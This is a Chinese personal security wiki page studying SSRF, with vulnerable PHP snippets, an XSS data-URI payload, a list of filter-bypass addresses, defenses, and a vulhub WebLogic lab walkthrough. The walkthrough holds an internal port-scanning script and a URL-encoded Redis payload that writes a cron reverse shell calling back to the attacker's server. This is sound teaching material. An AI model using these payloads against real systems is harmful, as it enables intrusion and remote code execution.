<!DOCTYPE html>
<html lang="zh-cn">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          WebSecurity-Ssrf - 信息安全个人wiki&amp;blog
        
    </title>

    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

<meta name="generator" content="Hexo 4.2.1"></head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>信息安全个人WIKI&amp;BLOG</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
<li><a href="/about">About</a></li>
<li><a href="/note">Notes</a></li>
</ul>
<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a><strong>web安全</strong></h1><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><ul>
<li><a href="/contents/xss">WebSecurity-xss</a></li>
<li><a href="/contents/csrf">WebSecurity-csrf</a></li>
<li><a href="/contents/ssrf">WebSecurity-ssrf</a></li>
<li><a href="/contents/FI">WebSecurity-FI</a></li>
<li><a href="/contents/rce">WebSecurity-rce</a></li>
<li><a href="/contents/upload">WebSecurity-upload</a></li>
<li><a href="/contents/xxe">WebSecurity-xxe</a></li>
</ul>
<h2 id="labs"><a href="#labs" class="headerlink" title="labs"></a>labs</h2><ul>
<li><a href="/contents/xsslabs">xss-demo项目练习</a></li>
<li><a href="/contents/sqllabs">sql-labs项目练习</a></li>
<li><a href="/contents/uploadlabs">upload-labs系列write-up</a></li>
<li><a href="/contents/code-breaking">code-breaking write-up</a></li>
</ul>
<h2 id="CTF-amp-AWD"><a href="#CTF-amp-AWD" class="headerlink" title="CTF&amp;AWD"></a>CTF&amp;AWD</h2><ul>
<li><a href="/contents/awd">百越杯AWD攻防源码复现分析</a></li>
<li><a href="/contents/jarvis">Jarvis oj web部分write-up</a></li>
<li><a href="/contents/babyphp">hacklu_CTF2018 write up</a></li>
<li><a href="/contents/suctf">suctf招新赛web全题解</a></li>
<li><a href="/contents/shanghai">骇极杯CTF Write up</a></li>
<li><a href="/contents/wangding">2018网鼎杯web部分write-up合集</a></li>
</ul>
<h2 id="实战-amp-总结"><a href="#实战-amp-总结" class="headerlink" title="实战&amp;总结"></a>实战&amp;总结</h2><ul>
<li><a href="/contents/login">登录框渗透总结</a></li>
<li><a href="/contents/logic">登录逻辑漏洞总结</a></li>
<li><a href="/contents/unauthorized">未授权访问渗透总结</a></li>
<li><a href="/contents/mysql-fileread">mysql客户端读取漏洞</a></li>
</ul>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a><strong>内网渗透</strong></h1><ul>
<li>待补充</li>
</ul>
<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><strong>代码审计</strong></h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
<li><a href="/contents/variable">代码审计基础之变量覆盖漏洞</a></li>
<li><a href="/contents/injection">代码审计基础之命令注入函数</a></li>
<li><a href="/contents/serialize">代码审计基础之php反序列化</a></li>
</ul>
<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><ul>
<li>待补充</li>
</ul>
<h1 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a><strong>安全开发</strong></h1><ul>
<li><a href="/contents/tools">一些工具的使用命令</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
  <div class="sidebar-toggle-inner"></div>
</div>

<script>
function add_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.add('show')  
}

function remove_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.remove('show')
}

function sidebar_toggle() {
    let sidebar_toggle = document.querySelector('.sidebar-toggle')
    let sidebar = document.querySelector('.book-sidebar')
    let content = document.querySelector('.off-canvas-content')
    if (sidebar_toggle.classList.contains('extend')) { // show
        sidebar_toggle.classList.remove('extend')
        sidebar.classList.remove('hide')
        content.classList.remove('extend')
    }
    else { // hide
        sidebar_toggle.classList.add('extend')
        sidebar.classList.add('hide')
        content.classList.add('extend')
    }
}
</script>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <p>仅以此文系统的学习一下ssrf漏洞,包括其原理，分类，绕过方式，防御方式<a id="more"></a></p>
<h2 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h2><h3 id="1-什么是SSRF"><a href="#1-什么是SSRF" class="headerlink" title="1.什么是SSRF?"></a>1.什么是SSRF?</h3><p>SSRF(Server-Side Request Forgery ，服务器端请求伪造)是一种由攻击者构造形成由服务器发起请求的一个安全漏洞，SSRF的主要攻击目标为外网无法访问的内部系统.简单来说SSRF就是将某台服务器作为跳板来访问内网</p>
<h3 id="2-SSRF漏洞产生的原理"><a href="#2-SSRF漏洞产生的原理" class="headerlink" title="2.SSRF漏洞产生的原理"></a>2.SSRF漏洞产生的原理</h3><p>SSRF的形成原因是由服务端提供了从其他服务器获取引用数据的功能，而在用户对目标地址可控的情况下，没有对目标地址做过滤和限制，从而导致了漏洞的产生</p>
<p>eg: 操作服务端从指定的url地址获取网页文本内容，加载指定地址的图片等。SSRF利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
<h3 id="3-危害"><a href="#3-危害" class="headerlink" title="3.危害"></a>3.危害</h3><ol>
<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</li>
<li>攻击运行在内网或本地的应用程序（比如redis）;</li>
<li>对内网web应用进行指纹识别，通过访问默认文件实现;</li>
<li>攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</li>
<li>利用file协议读取本地文件等。</li>
</ol>
<h3 id="4-出现的场景-来自ctf-wiki"><a href="#4-出现的场景-来自ctf-wiki" class="headerlink" title="4.出现的场景(来自ctf-wiki)"></a>4.出现的场景(来自ctf-wiki)</h3><ol>
<li>能够对外发起网络请求的地方，就可能存在SSRF漏洞</li>
<li>从远程服务器请求资源(Upload from url,Import &amp; Export RSS Feed)</li>
<li>数据库内置功能(Oracle、MongoDB、MSSQL、Postgres、CouchDB)</li>
<li>Webmail收取其他邮箱邮件(POP3、IMAP、SMTP)</li>
<li>文件处理、编码处理、属性信息处理(ffmpeg、ImageMagic、DOCX、PDF、XML)</li>
</ol>
<p><img src="/img/ssrf_1.png" alt=""></p>
<h3 id="5-检测方法"><a href="#5-检测方法" class="headerlink" title="5.检测方法"></a>5.检测方法</h3><p>服务器nc检测是否有来自对方服务器的请求信息</p>
<h2 id="0x02-后端实现"><a href="#0x02-后端实现" class="headerlink" title="0x02 后端实现"></a>0x02 后端实现</h2><h3 id="file-getcontents"><a href="#file-getcontents" class="headerlink" title="file_getcontents"></a>file_getcontents</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123; </span><br><span class="line">    $content = file_get_contents($_POST[<span class="string">'url'</span>]); </span><br><span class="line">    $filename =<span class="string">'./images/'</span>.rand().<span class="string">';img1.jpg'</span>; </span><br><span class="line">    file_put_contents($filename, $content); </span><br><span class="line">    <span class="keyword">echo</span> $_POST[<span class="string">'url'</span>]; </span><br><span class="line">    $img = <span class="string">"&lt;img src=\""</span>.$filename.<span class="string">"\"/&gt;"</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $img;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码使用file_get_contents函数从用户指定的URL获取图片。然后把该图片用一个随机文件名保存在硬盘上，并且展示给用户看 无论你访问什么都会返回一张图片 若是输入为url=<a href="http://127.0.0.1:80将会返回一张图片，而图片的内容即为其本机的80端口起的服务的内容">http://127.0.0.1:80将会返回一张图片，而图片的内容即为其本机的80端口起的服务的内容</a></p>
<p>这里介绍一种由file_get_contents有回显导致的xss</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test = $_GET[<span class="string">'test'</span>];</span><br><span class="line"><span class="keyword">if</span>(filter_var($test, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">	$r = parse_url($test);</span><br><span class="line">	print_r($r);</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/ssrf\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">			 <span class="comment">// get page from URL</span></span><br><span class="line">			 $a = file_get_contents($test);</span><br><span class="line">			 <span class="keyword">echo</span>($a);</span><br><span class="line">		  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			 <span class="keyword">echo</span> <span class="string">"Error: Host not allowed"</span>;</span><br><span class="line">		  &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Error: Invalid URL"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>检测了url是否符合规则，检测了host，很安全了，isn’t it？</p>
<p>这里我们可以用data协议导致xss</p>
<p><img src="/img/ssrf_3.png" alt=""></p>
<p>这里插入了我们的值 那么也可以插一段xss脚本</p>
<p>data://ssrf.com/plain;base64,PHNjcmlwdD5hbGVydGAxYDwvc2NyaXB0Pg==</p>
<p><img src="/img/ssrf_4.png" alt=""></p>
<h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen"></a>fsockopen</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span><span class="params">($host,$port,$link)</span> </span>&#123; </span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="number">30</span>); </span><br><span class="line">    <span class="keyword">if</span> (!$fp) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$errstr (error number $errno) \n"</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        $out = <span class="string">"GET $link HTTP/1.1\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"Host: $host\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"Connection: Close\r\n\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"\r\n"</span>; </span><br><span class="line">        fwrite($fp, $out); </span><br><span class="line">        $contents=<span class="string">''</span>; </span><br><span class="line">        <span class="keyword">while</span> (!feof($fp)) &#123; </span><br><span class="line">            $contents.= fgets($fp, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        <span class="keyword">return</span> $contents; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码使用 fsockopen 函数实现获取用户制定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。</p>
<h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    $link = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    $curlobj = curl_init();</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    $result=curl_exec($curlobj);</span><br><span class="line">    curl_close($curlobj);</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">'./curled/'</span>.rand().<span class="string">'.txt'</span>;</span><br><span class="line">    file_put_contents($filename, $result); </span><br><span class="line">    <span class="keyword">echo</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用 curl 获取数据。这个本来想在本机上复现的，可是一直出现500错误，也不知道哪里的问题</p>
<p>大概也是url处构造目标网站 然后判断返回 和<code>file_get_content</code>一样</p>
<h2 id="0x03-绕waf"><a href="#0x03-绕waf" class="headerlink" title="0x03 绕waf"></a>0x03 绕waf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">利用特殊符号</span><br><span class="line">	<span class="number">0</span>:<span class="comment">//127.0.0.1:80;example.com:80/</span></span><br><span class="line">	<span class="number">0</span>:<span class="comment">//127.0.0.1:80,example.com:80/</span></span><br><span class="line">攻击本地</span><br><span class="line">	<span class="number">1.</span>http:<span class="comment">//127.0.0.1:80</span></span><br><span class="line">	<span class="number">2.</span>http:<span class="comment">//localhost:22</span></span><br><span class="line">利用[::]</span><br><span class="line">	http:<span class="comment">//[::]:80  ---&gt; http://127.0.0.1</span></span><br><span class="line">利用@</span><br><span class="line">	http:<span class="comment">//example.com@127.0.0.1</span></span><br><span class="line">利用短地址</span><br><span class="line">	http:<span class="comment">//suo.im/8qE9  ---&gt;  http://127.0.0.1</span></span><br><span class="line">特殊域名</span><br><span class="line">	http:<span class="comment">//127.0.0.1.xip.io   ---&gt;  http://127.0.0.1</span></span><br><span class="line">	http:<span class="comment">//www.owasp.org.127.0.0.1.xip.io   ---&gt;  http://127.0.0.1</span></span><br><span class="line">利用dns解析</span><br><span class="line">	<span class="comment">//在域名设置记录指向127.0.0.1</span></span><br><span class="line">	http:<span class="comment">//ssrf.ur10ser.xyz/</span></span><br><span class="line">利用句号</span><br><span class="line">	<span class="number">127</span>。<span class="number">0</span>。<span class="number">0</span>。<span class="number">1</span>  &gt;&gt;&gt;  <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>(这里并没成功= =)</span><br><span class="line">利用进制转换</span><br><span class="line">	http:<span class="comment">//0163.073751033 8进制</span></span><br><span class="line">	http:<span class="comment">//0x73.0x000EFD21B  16进制</span></span><br><span class="line">利用<span class="number">302</span>跳转</span><br><span class="line">	http:<span class="comment">//127.0.0.1.xip.io/ 会自动跳转到127.0.0.1</span></span><br><span class="line">	还有一些自己写的<span class="number">302</span>也行</span><br><span class="line">其他</span><br><span class="line">	<span class="number">127.00</span><span class="number">.1</span></span><br><span class="line">    <span class="number">127.0</span><span class="number">.01</span></span><br><span class="line">    <span class="number">0.00</span><span class="number">.0</span></span><br><span class="line">    <span class="number">127.1</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="number">127.10</span><span class="number">.1</span></span><br><span class="line">    <span class="number">127.1</span><span class="number">.01</span></span><br><span class="line">    <span class="number">0177.1</span></span><br><span class="line">    <span class="number">0177.0001</span><span class="number">.0001</span></span><br><span class="line">    <span class="number">0x7f</span><span class="number">.0</span>x0<span class="number">.0</span>x0<span class="number">.0</span>x1</span><br><span class="line">    <span class="number">0177.0000</span><span class="number">.0000</span><span class="number">.0001</span></span><br><span class="line">    <span class="number">0177.0001</span><span class="number">.0000</span><span class="number">.0001</span></span><br><span class="line">    <span class="number">0x7f</span><span class="number">.0</span>x1<span class="number">.0</span>x0<span class="number">.0</span>x1</span><br><span class="line">    <span class="number">0x7f</span><span class="number">.0</span>x1<span class="number">.0</span>x1</span><br><span class="line">    localtest.me</span><br></pre></td></tr></table></figure>

<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><ol>
<li>过滤返回信息，验证远程服务器对请求的响应</li>
<li>统一错误信息，避免用户通过错误信息来判断远端服务器的端口状态</li>
<li>限制请求的端口</li>
<li>黑名单内网ip。避免攻击内网</li>
<li>禁止使用不必要的协议。如<code>file:///,gopher://ftp//</code>等等</li>
</ol>
<h2 id="0x05-实战"><a href="#0x05-实战" class="headerlink" title="0x05 实战"></a>0x05 实战</h2><h3 id="ssrf打内网redis"><a href="#ssrf打内网redis" class="headerlink" title="ssrf打内网redis"></a>ssrf打内网redis</h3><p>本次实战使用的是<code>vulhub</code>上的环境</p>
<p>下载下来直接<code>docker-compose -d up</code>就好</p>
<p>最好弄个docker加速器 然后在服务器上跑 贼快(:逃</p>
<p>存在漏洞的页面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;服务器:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:12345</span><br></pre></td></tr></table></figure>

<p>其中operator值存在ssrf </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">正确时:</span><br><span class="line">The server at http:&#x2F;&#x2F;127.0.0.1:7001 returned a 404 error code (Not Found). Please ensure that your URL is correct, and the web service has deployed without error.</span><br><span class="line">错误时:</span><br><span class="line">Tried all: &#39;1&#39; addresses, but could not connect over HTTP to server:&#39;127.0.0.1&#39;,port: &#39;7000&#39;</span><br></pre></td></tr></table></figure>

<p>写个小脚本探测下端口</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">base_url = <span class="string">"http://服务器:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://"</span></span><br><span class="line">ip = <span class="string">"127.0.0.1"</span></span><br><span class="line">ip_list = [<span class="string">"172.20.0.2"</span>,<span class="string">"172.20.0.3"</span>,<span class="string">"172.18.0.4"</span>,<span class="string">"172.18.0.5"</span>,<span class="string">"172.18.0.6"</span>,<span class="string">"172.18.0.7"</span>]</span><br><span class="line">port_list = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">25</span>,<span class="number">69</span>,<span class="number">79</span>,<span class="number">80</span>,<span class="number">88</span>,<span class="number">110</span>,<span class="number">113</span>,<span class="number">119</span>,<span class="number">220</span>,<span class="number">443</span>,<span class="number">3306</span>,<span class="number">6379</span>,<span class="number">7001</span>,<span class="number">8080</span>,<span class="number">8888</span>,<span class="number">1433</span>,<span class="number">12345</span>,<span class="number">65535</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> ip_list:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> port_list:</span><br><span class="line">		url = base_url + j + <span class="string">':'</span> + str(i)</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			res = requests.get(url,timeout=<span class="number">2</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">"but could not connect over HTTP"</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">				print(j+ <span class="string">"  "</span>+ str(i)+<span class="string">"open!"</span>)</span><br><span class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">#print(url)</span></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(res.text)</span></span><br><span class="line"><span class="comment">#print(bool("returned a 404 error code" in res.text))</span></span><br></pre></td></tr></table></figure>

<p>这里由于知道docker的ip机制(docker inspect )</p>
<p>现实中是需要对内网地址进行猜解的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">172.20.0.2  6379open!</span><br><span class="line">172.20.0.3  7001open!</span><br></pre></td></tr></table></figure>

<p>得到两个地址 7001是我们的weblogic服务</p>
<p>而6379百度一下就知道是redis服务 猜测这里要使用未授权访问漏洞</p>
<p>抄作业中</p>
<p>发送三条redis命令，将弹shell脚本写入<code>/etc/crontab</code>：</p>
<p>其中crontab是linux下的一个定时执行事件的一个程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[服务器ip]&#x2F;[监听端口] 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>进行url编码后得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fxxxxx%2Fxxxxx%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0A</span><br></pre></td></tr></table></figure>

<p>然后将这一大串拼接到ssrf那个点上</p>
<p>得到payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.20.0.2:6379&#x2F;%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F[服务器ip]%2F8888%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0A</span><br></pre></td></tr></table></figure>

<p>然后在服务器上 <code>nc  -l -p 8888 -vvv</code>  过个几秒钟 即可收到shell</p>
<p><img src="/img/ssrf_2.jpg" alt=""></p>
<p>可以看到burp右边也出现了我输入的命令的回显，证明我们的命令已经被服务器接受</p>
<h3 id="某src案例"><a href="#某src案例" class="headerlink" title="某src案例"></a>某src案例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">某src可以插入外链图片，而服务器那边的处理是服务器先请求外链，然后在抓取外链图片，不过程序限死了后缀名为.jpg,同时会自动截断掉?,#等字符后面的字符</span><br><span class="line">绕过思路：设置解析后缀名为jpg的文件解析成php 然后php进行302跳转</span><br><span class="line">		服务器请求一下，跟着302跳转，抓取到302跳转后的主页，然后保存为jpg图片文件</span><br></pre></td></tr></table></figure>

<h2 id="0x06-referer"><a href="#0x06-referer" class="headerlink" title="0x06 referer"></a>0x06 referer</h2><p><a href="https://skysec.top/2017/08/19/SSRF%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">一叶飘零大佬总结</a></p>
<p><a href="https://southseast.cc/2018/11/15/Study-SSRF/" target="_blank" rel="noopener">关于ssrf的初探</a></p>
<p><a href="https://vulhub.org/#/environments/weblogic/ssrf/" target="_blank" rel="noopener">vulhub</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avater.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>root</div>
      <div>2019-04-26</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/WEB/">WEB</a>

      <a class="tag-link" href="/tags/ssrf/" rel="tag">#ssrf</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
